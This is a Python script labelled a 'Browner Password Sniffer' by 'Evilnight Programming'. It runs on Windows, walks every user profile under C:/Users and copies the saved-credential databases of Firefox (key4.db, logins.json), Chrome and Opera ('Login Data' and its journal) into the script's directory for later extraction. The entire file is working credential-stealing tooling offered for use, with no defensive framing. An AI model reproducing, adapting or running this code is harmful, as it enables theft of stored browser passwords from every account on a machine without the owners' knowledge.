import os
import platform
from shutil import copyfile

# Evilnight Programming
# Browner Password Sniffer
# version 1.3 29/7/2018
# Mozilla/Chrome/Opera for Windows

ScriptsDirectory = os.getcwd()
print("The Scripts Directory is " + ScriptsDirectory + "\n")

# Constants
UsersDir = "C:/Users/"
UsersDir2 = "/AppData/Roaming/Mozilla/Firefox/Profiles/"
UsersDir3 = "/AppData/Local/Google/Chrome/User Data/Default/"
UsersDir4 = "/AppData/Roaming/Opera Software/Opera Stable"
file1 = "key4.db"
file2 = "logins.json"
file3 = "Login Data"
file4 = "Login Data-journal"

OsName = platform.system()
if OsName == "Windows":

    Users = os.listdir(UsersDir)
    Users.remove("All Users")
    Users.remove("Public")
    Users.remove("Default")
    Users.remove("Default User")
    Users.remove("desktop.ini")

    for User in Users:
        tempUsersDir = UsersDir + User
        print("\nChecking if User " + User + " has a mozilla profile")
        tempUsersDir = tempUsersDir + UsersDir2
        if os.path.exists(tempUsersDir):
            pass
        else:
            print("No Installation of Mozilla Found!\n")
            break
        if os.listdir(tempUsersDir):
            tempProfile = os.listdir(tempUsersDir)
            for found in tempProfile:
                temp2UsersDir = tempUsersDir + found
                print(temp2UsersDir)
                SDUser = ScriptsDirectory + "/Mozilla" + found
                os.mkdir(SDUser)
                if os.path.exists(temp2UsersDir + "/" + file1):
                    copyfile(temp2UsersDir + "/" + file1, SDUser + "/" + file1)
                if os.path.exists(temp2UsersDir + "/" + file2):
                    copyfile(temp2UsersDir + "/" + file2, SDUser + "/" + file2)

        print("Done with User: " + User + " for Mozilla\n")

    for User in Users:
        tempUsersDir2 = UsersDir + User
        print("\nChecking if User " + User + " has a Chrome profile...")
        tempUsersDir2 = tempUsersDir2 + UsersDir3
        if os.path.exists(tempUsersDir2):
            pass
        else:
            print("\nNo Installation of Chrome Found!\n")
            break
        if os.listdir(tempUsersDir2):
            temp2UsersDir = tempUsersDir2
            print(temp2UsersDir)
            SDUser = ScriptsDirectory + "/Chrome"
            os.mkdir(SDUser)
            if os.path.exists(temp2UsersDir + "/" + file3):
                copyfile(temp2UsersDir + "/" + file3, SDUser + "/" + file3)
            if os.path.exists(temp2UsersDir + "/" + file4):
                copyfile(temp2UsersDir + "/" + file4, SDUser + "/" + file4)
        else:
            break

        print("Done with User: " + User + " for Chrome\n")

    for User in Users:
        tempUsersDir3 = UsersDir + User
        print("\nChecking if User " + User + " has a Opera profile")
        tempUsersDir3 = tempUsersDir3 + UsersDir4
        if os.path.exists(tempUsersDir3):
            pass
        else:
            print("No Installation of Opera Found!\n")
            break
        if os.listdir(tempUsersDir3):
            temp2UsersDir = tempUsersDir3
            print(temp2UsersDir)
            SDUser = ScriptsDirectory + "/Opera"
            os.mkdir(SDUser)
            if os.path.exists(temp2UsersDir + "/" + file3):
                copyfile(temp2UsersDir + "/" +file3, SDUser + "/" + file3)
            if os.path.exists(temp2UsersDir + "/" + file4):
                copyfile(temp2UsersDir + "/" + file4, SDUser + "/" + file4)

        print("Done with User: " + User + " for Opera\n")


print("Script has Finished you can locate the new files in the Script's main Directory")
exit(1)









